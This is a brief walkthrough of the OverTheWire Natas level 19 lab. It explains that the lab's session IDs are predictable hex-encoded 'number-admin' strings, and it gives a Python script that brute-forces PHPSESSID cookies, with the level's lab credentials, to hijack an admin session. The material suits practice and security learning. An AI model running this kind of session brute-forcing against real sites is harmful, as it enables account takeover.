# Web vulnerability
Insecure session management
# Method of solve
It looks like this app is still using the same method of assigning session IDs to be used as cookies, but a dash and the name of the user is appended, so a random "admin" login might look like:
```
101-admin
```
The cookie is then encoded from ASCII to hexadecimal, so the resulting cookie is a hex string. So what we need to do I run the same script as the last level, but after generating the number in the range, prepend it to "-admin" and then convert it to hexadecimal before sending each request. This script should do the job
```
import requests

url = "http://natas19.natas.labs.overthewire.org/index.php"
auth = ("natas19", "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr")  # Replace with target creds

for session_id in range(1, 641):
    formatted_session_id = str(session_id) + '-admin'
    encoded_session_id = formatted_session_id.encode('utf-8').hex() 
    print(f"Current cookie: {encoded_session_id}")
    cookies = {"PHPSESSID": str(encoded_session_id)}
    response = requests.get(url, auth=auth, cookies=cookies)
    
    if "You are an admin" in response.text:
        print(f"Admin session found! PHPSESSID={session_id}")
        print(response.text)
        break
```
